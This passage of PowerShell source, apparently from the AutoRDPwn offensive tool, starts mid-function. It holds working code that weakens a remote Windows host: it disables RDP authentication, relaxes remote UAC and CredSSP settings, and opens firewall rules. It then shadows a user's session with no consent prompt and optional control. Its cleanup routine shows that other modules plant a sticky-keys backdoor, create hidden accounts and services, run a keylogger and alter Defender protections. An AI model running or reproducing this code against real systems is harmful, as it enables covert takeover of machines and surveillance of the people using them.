        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareServer' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowToGetHelp' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowFullControl' 1
        Set-ARRemoteDword $winstation 'SecurityLayer' 0
        Set-ARRemoteDword $winstation 'UserAuthentication' 0
        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'LocalAccountTokenFilterPolicy' 1
        New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Force | Out-Null
        Set-ARRemoteDword 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' 'AllowEncryptionOracle' 2
        Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' -ErrorAction SilentlyContinue
        if (-not (Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any -ErrorAction SilentlyContinue | Out-Null
        }
        $caption = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $isServer = $caption -like '*Server*'
        $sessionId = $null
        if (-not $isServer) {
            try { $sessionId = (Get-Process explorer -ErrorAction SilentlyContinue | Sort-Object SessionId | Select-Object -Last 1).SessionId } catch { }
            if (-not $sessionId) { $sessionId = 1 }
        }
        [pscustomobject]@{
            AllowRemoteRpc = $allowRemoteRpc
            IsServer = $isServer
            HostName = $env:COMPUTERNAME
            SessionId = $sessionId
            Caption = $caption
            RegistryBackup = @($registryBackup.ToArray())
        }
    }
    foreach ($entry in @($previous.RegistryBackup)) {
        if (-not $entry) { continue }
        # The oldest snapshot wins: a second run must not record the values it just wrote.
        $known = $false
        foreach ($existing in $script:ARRegistryBackup) {
            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
        }
        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
    }

        $plain = ''
        if ($credential) { $plain = $credential.GetNetworkCredential().Password }
        if ($credential -and $plain -ne '') {
            # Tracked before the add: an interrupted run must still delete the credential.
            if (-not $script:ARCmdKeyTargets.Contains($target)) { $script:ARCmdKeyTargets.Add($target) }
            $stored = $false
            try {
                cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
                if ($LASTEXITCODE -ne 0) { throw ('cmdkey /add exited with code ' + $LASTEXITCODE) }
                $stored = $true
            }
            catch {
                Write-ARWarn ('Stored credential for ' + $target + ' was not created: ' + $_.Exception.Message)
            }
            finally {
                if (-not $stored) { cmdkey.exe "/delete:$target" 2>&1> $null }
            }
        }
        Write-ARInfo ((([string](Get-ARText 'txt33' 'Detecting operating system version on')).TrimEnd()) + ' ' + ([string]$previous.HostName).ToLowerInvariant())
        if ($null -eq $previous.AllowRemoteRpc -or [int]$previous.AllowRemoteRpc -eq 0) {
            Write-ARWarn (Get-ARText 'txt86' 'The remote machine needs a reboot to apply the changes, rebooting..')
            try { Invoke-Command -Session $session -ScriptBlock { Restart-Computer -Force } -ErrorAction SilentlyContinue } catch { }
            try { Remove-PSSession -Session $session -ErrorAction SilentlyContinue } catch { }
            $script:ARSession = $null
            Start-Sleep -Seconds 60
            $session = $null
            for ($attempt = 0; $attempt -lt 30; $attempt++) {
                Start-Sleep -Seconds 3
                try {
                    $session = Connect-ARTargetSession -Credential $credential -Force
                    if ($session) { break }
                } catch { }
            }
            if (-not $session) { throw 'The target did not come back after the reboot.' }
        }

        if ($previous.IsServer) {
            try {
                Invoke-Command -Session $session -ScriptBlock {
                    (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) | Out-Null
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
            $query = Invoke-Command -Session $session -ScriptBlock { query session 2>&1 } -ErrorAction SilentlyContinue
            Show-ARText $query
            $sessionId = Get-ARSessionId -Lines $session -Fallback 1
            if (-not $script:ARInvokedFromOption) {
                $answer = Read-ARValue (Get-ARText 'txt36' 'What session do you want to connect to?') ([string]$sessionId)
                if ($answer -match '^\d+$') { $sessionId = [int]$answer }
            }
        }
        else {
            $sessionId = [int]$previous.SessionId
            if (-not $sessionId) { $sessionId = 1 }
            try { Install-ARRdpWrap -Session $session }
            catch { Write-ARWarn ('RDPWrap could not be installed: ' + $_.Exception.Message) }
        }

        $arguments = @("/v:$target", '/admin')
        if ($sessionId) {
            $arguments += "/shadow:$sessionId"
            $arguments += '/noconsentprompt'
            if ($control) { $arguments += '/control' }
        }
        $arguments += '/f'
        if ($script:ARNoGui) {
            Write-Host ('mstsc ' + ($arguments -join ' ')) -ForegroundColor DarkGray
        }
        else {
            Write-ARInfo (Get-ARText 'txt38' 'Starting remote connection!')
            Start-Process -FilePath 'mstsc.exe' -ArgumentList $arguments | Out-Null
        }
        return [pscustomobject]@{ Control = $control; SessionId = $sessionId; FullDesktop = (-not $sessionId) }
}


function Invoke-ARAction {
    param([Parameter(Mandatory = $true)][string]$Id)
    $action = Get-ARActionById $Id
    if (-not $action) {
        Write-ARError 'Unknown action.'
        return
    }
    Clear-ARScreen
    Set-ARStatus ($action.Title) 'Info'
    $script:ARLastFailure = ''
    try {
        & $action.Handler
        if ($script:ARStatus['Kind'] -eq 'Info') { Set-ARStatus ($action.Title + ' finished') 'Ok' }
    }
    catch {
        $script:ARLastFailure = $_.Exception.Message
        Set-ARStatus $_.Exception.Message 'Error'
        Write-ARError $_.Exception.Message
    }
    if (-not $script:ARInvokedFromOption) {
        Write-ARBlank
        Write-Host ' Press any key to return to the menu' -ForegroundColor DarkGray
        try { $null = [Console]::ReadKey($true) } catch { try { Read-Host | Out-Null } catch { } }
    }
}

function Remove-ARTargetArtifacts {
    param([System.Management.Automation.Runspaces.PSSession]$Session)
    $status = [pscustomobject]@{
        HadSession = $false
        Errors     = 0
        Skipped    = New-Object System.Collections.Generic.List[string]
    }
    if (-not $Session) {
        $status.Skipped.Add('target session')
        return $status
    }
    $status.HadSession = $true
    $tempDirs = @($script:ARRemoteTempDirs.ToArray())
    $accounts = @($script:ARCreatedAccounts.ToArray())
    if ($script:ARHashUserName -ne '') { $accounts += $script:ARHashUserName }
    $rules = @($script:ARFirewallRules.ToArray())
    try {
        Invoke-ARRemote -Session $Session -ArgumentList $tempDirs, $accounts, $rules -ScriptBlock {
            param($dirs, $users, $firewallRules)
            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
            # Tasks created by the stealth screen module survive an interrupted run.
            try {
                Get-ScheduledTask -ErrorAction Stop | Where-Object {
                    $_.TaskName -like 'AutoRDPwn*' -or ($_.TaskName -match '^W[0-9A-F]{8}$' -and (($_.Actions | ForEach-Object { [string]$_.Execute + ' ' + [string]$_.Arguments }) -join ' ') -match 'Windows\\Temp\\W[0-9A-F]{8}\.ps1')
                } | ForEach-Object {
                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                }
            }
            catch { }
            Remove-Item -LiteralPath 'C:\Windows\Temp\vncb64.txt', 'C:\Windows\Temp\vnc.ps1', 'C:\Windows\Temp\vnclog.txt', 'C:\Windows\Temp\ss.ps1' -Force -ErrorAction SilentlyContinue
            Get-ChildItem -LiteralPath 'C:\Windows\Temp' -Directory -Filter 'AutoRDPwn*' -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
            foreach ($directory in $dirs) {
                Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
            }
            foreach ($service in @('WinShotSvc', 'WinSessionSvc')) {
                if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
                    sc.exe stop $service 2>&1> $null
                    sc.exe delete $service 2>&1> $null
                }
            }
            foreach ($userName in $users) {
                if (-not $userName) { continue }
                try {
                    if (Get-LocalUser -Name $userName -ErrorAction Stop) {
                        net user $userName /delete 2>&1> $null
                        Remove-Item -LiteralPath (Join-Path 'C:\Users' $userName) -Recurse -Force -ErrorAction SilentlyContinue
                    }
                }
                catch { }
            }
            foreach ($key in @('sethc.exe', 'Utilman.exe')) {
                $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
                try {
                    $debugger = (Get-ItemProperty -Path $path -Name 'Debugger' -ErrorAction Stop).Debugger
                    if ([string]$debugger -like 'powershell.exe -noexit*') {
                        Remove-ItemProperty -Path $path -Name 'Debugger' -Force -ErrorAction SilentlyContinue
                    }
                }
                catch { }
            }
            foreach ($rule in @($firewallRules + 'AutoRDPwn-TermService-RPC-In')) {
                netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            }
        } | Out-Null
    }
    catch {
        $status.Errors++
        $status.Skipped.Add('target artifacts')
        Write-ARWarn ('Target cleanup incomplete: ' + $_.Exception.Message)
    }

    # Registry values written by the shadow engine: replay the state read before each write.
    $registryBackup = @($script:ARRegistryBackup.ToArray())
    if ($registryBackup.Count -gt 0) {
        try {
            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList $registryBackup -ScriptBlock {
                param($entries)
                $failed = New-Object System.Collections.Generic.List[string]
                foreach ($entry in $entries) {
                    $path = [string]$entry.KeyPath
                    $name = [string]$entry.Name
                    try {
                        if (-not (Test-Path -LiteralPath $path)) { continue }
                        if (-not $entry.Existed) {
                            Remove-ItemProperty -Path $path -Name $name -Force -ErrorAction SilentlyContinue
                            continue
                        }
                        $kind = [string]$entry.Kind
                        $value = $entry.Value
                        if ($kind -eq 'MultiString') { $value = [string[]]@($entry.Value) }
                        elseif ($kind -eq 'Binary') { $value = [byte[]]@($entry.Value) }
                        elseif ($kind -eq 'DWord' -or $kind -eq 'QWord') { $value = [int64]$entry.Value }
                        else { $value = [string]$entry.Value }
                        New-ItemProperty -Path $path -Name $name -Value $value -PropertyType $kind -Force -ErrorAction SilentlyContinue | Out-Null
                    }
                    catch { $failed.Add($name + ': ' + $_.Exception.Message) }
                }
                return $failed.ToArray()
            })
            foreach ($failure in $failures) {
                $status.Errors++
                $status.Skipped.Add('registry: ' + [string]$failure)
                Write-ARWarn ('Registry value not restored: ' + [string]$failure)
            }
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('registry restore')
            Write-ARWarn ('Registry restore incomplete: ' + $_.Exception.Message)
        }
        $script:ARRegistryBackup.Clear()
    }

    # MSI products that appeared during this run: uninstall them by product code.
    $products = @($script:ARInstalledProducts.ToArray())
    if ($products.Count -gt 0) {
        try {
            Write-ARProgress -Activity 'Uninstalling MSI products' -Percent 10 -Status ('Removing ' + $products.Count + ' product(s)')
            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList $products -ScriptBlock {
                param($productCodes)
                $roots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
                $failed = New-Object System.Collections.Generic.List[string]
                foreach ($code in $productCodes) {
                    try {
                        if ([string]$code -match '^\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$') {
                            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/x', [string]$code, '/qn', '/norestart') -Wait
                        }
                        foreach ($root in $roots) {
                            $key = Join-Path $root ([string]$code)
                            if (Test-Path -LiteralPath $key) { Remove-Item -LiteralPath $key -Recurse -Force -ErrorAction SilentlyContinue }
                        }
                    }
                    catch { $failed.Add([string]$code + ': ' + $_.Exception.Message) }
                }
                return $failed.ToArray()
            })
            Write-ARProgress -Activity 'Uninstalling MSI products' -Percent 100 -Status 'Uninstall finished'
            foreach ($failure in $failures) {
                $status.Errors++
                $status.Skipped.Add('msi: ' + [string]$failure)
                Write-ARWarn ('MSI product not removed: ' + [string]$failure)
            }
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('msi uninstall')
            Write-ARWarn ('MSI uninstall incomplete: ' + $_.Exception.Message)
        }
        $script:ARInstalledProducts.Clear()
    }

    # Firewall rules we re-enabled during the run go back to disabled.
    $firewallRestore = @($script:ARFirewallRestore.ToArray())
    if ($firewallRestore.Count -gt 0) {
        try {
            $ruleNames = @($firewallRestore | ForEach-Object { [string]$_.Name } | Where-Object { $_ -ne '' })
            Invoke-ARRemote -Session $Session -ArgumentList $ruleNames -ScriptBlock {
                param($names)
                foreach ($name in $names) {
                    Set-NetFirewallRule -Name $name -Enabled False -ErrorAction SilentlyContinue
                }
            } | Out-Null
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('firewall restore')
            Write-ARWarn ('Firewall rules not restored: ' + $_.Exception.Message)
        }
        $script:ARFirewallRestore.Clear()
    }

    # Defender preferences changed on the target get replayed to their prior state.
    $defenderChanges = @($script:ARRemoteDefenderChanges.ToArray())
    if ($defenderChanges.Count -gt 0) {
        try {
            Invoke-ARRemote -Session $Session -ArgumentList $defenderChanges -ScriptBlock {
                param($changes)
                foreach ($change in $changes) {
                    $kind = [string]$change.Kind
                    if ($kind -eq 'ExclusionPath') {
                        Remove-MpPreference -ExclusionPath ([string]$change.Name) -ErrorAction SilentlyContinue
                    }
                    elseif ($kind -eq 'DisableRealtimeMonitoring') {
                        Set-MpPreference -DisableRealtimeMonitoring ([bool]$change.Value) -ErrorAction SilentlyContinue
                    }
                }
            } | Out-Null
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('defender restore')
            Write-ARWarn ('Defender preferences not restored: ' + $_.Exception.Message)
        }
        $script:ARRemoteDefenderChanges.Clear()
    }
    return $status
}

function Invoke-ARCleanup {
    if ($script:ARCleanupDone) { return }
    $script:ARCleanupDone = $true
    $targetStatus = $null
    if (-not $script:ARNoClean) {
        $targetStatus = Remove-ARTargetArtifacts -Session $script:ARSession
        $script:ARHashUserName = ''
    }
    # Operator-side traces are always removed, even with -noclean: a stored
    # credential or an extracted binary must not outlive the session.
    foreach ($target in $script:ARCmdKeyTargets.ToArray()) {
        cmdkey.exe "/delete:$target" 2>&1> $null
    }
    $script:ARCmdKeyTargets.Clear()
    # Module artifacts (keylogger log, RDP cache) live on the target, so they
    # have to go while the session is still open. The operator-side proxy reset
    # below can wait until after teardown.
    if (Get-Command Remove-ARModuleArtifacts -ErrorAction SilentlyContinue) {
        try { Remove-ARModuleArtifacts } catch { }
    }
    Close-ARTargetSession
    Restore-ARDefender
    foreach ($directory in $script:ARWorkDirs.ToArray()) {
        if (Test-Path -LiteralPath $directory) {
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    foreach ($file in $script:ARTemporaryFiles.ToArray()) {
        if (Test-Path -LiteralPath $file) {
            Remove-Item -LiteralPath $file -Force -ErrorAction SilentlyContinue
        }
    }
    $script:ARWorkDirs.Clear()
    $script:ARTemporaryFiles.Clear()
    $script:ARRemoteTempDirs.Clear()
    $script:ARRemoteTasks.Clear()
    $script:ARCreatedAccounts.Clear()
    $script:ARFirewallRules.Clear()
    $script:AROverrideCredential = $null
    if (Get-Command Reset-AROperatorPortProxies -ErrorAction SilentlyContinue) {
        try { Reset-AROperatorPortProxies } catch { }
    }
    try { Set-Location -LiteralPath $script:AROriginalLocation } catch { }
    if ($targetStatus -and -not $targetStatus.HadSession) {
        $targetName = 'the target'
        try { $targetName = Get-ARTargetComputer } catch { }
        Write-ARWarn ('Cleanup skipped: no session to ' + $targetName)
    }
    elseif ($targetStatus -and $targetStatus.Errors -gt 0) {
        $steps = @($targetStatus.Skipped | Select-Object -First 5)
        Write-ARWarn ((Get-ARText 'txt76' 'Cleaning done!') + ' ' + $targetStatus.Errors + ' step(s) failed: ' + ($steps -join '; '))
    }
    else {
        Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
    }
}
